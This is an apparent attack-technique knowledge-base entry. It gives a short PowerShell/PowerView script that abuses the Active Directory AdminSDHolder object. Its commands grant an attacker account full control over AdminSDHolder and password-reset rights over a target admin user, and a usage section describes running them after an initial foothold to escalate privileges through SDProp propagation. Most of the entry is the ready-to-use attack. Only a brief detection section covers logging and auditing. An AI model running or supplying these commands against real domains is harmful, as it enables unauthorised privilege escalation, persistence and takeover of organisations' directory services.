---
id: 1b830316-542e-44ad-a6cf-14f14f515279
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:06.430273+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - acl-modification
  - adminsdholder
validated: true
---

# powershell-admin-sdholder-acl-modification-script

## Code

```powershell
# Add a user to the AdminSDHolder group:
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose

# Right to reset password for toto using the account titi
Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword

# Give all rights
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
```

## Description

This PowerShell script modifies ACLs on the AdminSDHolder object and a target user to grant full control and specific rights like password reset. It uses PowerView functions to enable privilege escalation via propagation to protected AD groups.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| domain | Target domain components | domain,local |
| username | Attacker's principal for full control | controlleduser |
| toto | Target account for rights (e.g., admin user) | targetadmin |
| titi | Principal account gaining rights | attacker |

## Usage

Execute in a PowerShell session with AD modules loaded on a domain-joined machine. Substitute placeholders, then run before forcing SDProp propagation. Used in privilege escalation scenarios after initial foothold.

## Detection

- Monitor PowerShell ScriptBlock logging for Add-DomainObjectAcl or Add-ObjectAcl executions.
- Audit AD object modifications (Event ID 4742 for ACL changes).
- BloodHound queries for paths to AdminSDHolder.

## Related

- [[procedures/Abuse-AdminSDHolder-for-Privilege-Escalation]]
- [[commands/add-full-control-acl-to-adminsdholder]]
